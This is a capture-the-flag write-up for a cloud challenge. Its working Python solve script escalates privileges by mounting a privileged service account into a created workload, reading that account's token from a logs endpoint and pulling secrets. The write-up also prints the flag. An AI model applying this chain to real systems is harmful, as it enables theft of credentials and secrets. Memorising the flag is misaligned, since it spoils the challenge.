---
title: "Greenroom Atlas"
ctf: "Safaricom CTF"
date: 2026-10-04
category: cloud
difficulty: hard
points: 750
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Greenroom Atlas

## Summary

Target: http://54.72.82.22:8410 (Werkzeug 3.1.9 / Python 3.11.16, Flask).

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Greenroom Atlas (CLOUD, 750 pts) — Safaricom CTF.

Chain: /api/login mints the `tour-bot` identity (get:workloads,
patch:rolebindings). Create a workload whose spec automounts the
`archive-agent` service account (automountServiceAccountToken=true); the
per-workload logs endpoint then hands back that service account's token.
`archive-agent` holds get:secrets, so GET /api/secrets returns the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests


def main(target):
    t = target.rstrip("/")
    s = requests.Session()

    # 1) mint the tour-bot identity
    r = s.post(f"{t}/api/login", json={}, timeout=15)
    r.raise_for_status()
    tok = r.json()["token"]
    print(f"[+] login token: {tok}")
    h = {"Authorization": f"Bearer {tok}"}

    # 2) create a workload that automounts the archive-agent service account
    spec = {
        "spec": {
            "serviceAccountName": "archive-agent",
            "automountServiceAccountToken": True,
        }
    }
    r = s.post(f"{t}/api/workloads", json=spec, headers=h, timeout=15)
    r.raise_for_status()
    name = r.json()["name"]
    print(f"[+] workload: {name}")

    # 3) the logs endpoint leaks the projected service-account token
    r = s.get(f"{t}/api/workloads/{name}/logs", headers=h, timeout=15)
    r.raise_for_status()
    sa = r.json()["token"]
    print(f"[+] service account token: {sa}")

    # 4) archive-agent can read secrets
    r = s.get(
        f"{t}/api/secrets",
        headers={"Authorization": f"Bearer {sa}"},
        timeout=15,
    )
    r.raise_for_status()
    msg = r.json()["message"]
    print(f"[+] secrets: {msg}")
    return msg


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8410"
    out = main(target)
    m = re.search(r"safctf\{[0-9a-f]{32}\}", out)
    print("\nFLAG:", m.group(0) if m else "NOT FOUND")

```

## Flag

```
safctf{6035ffad158ce604cb84927b77926d47}
```
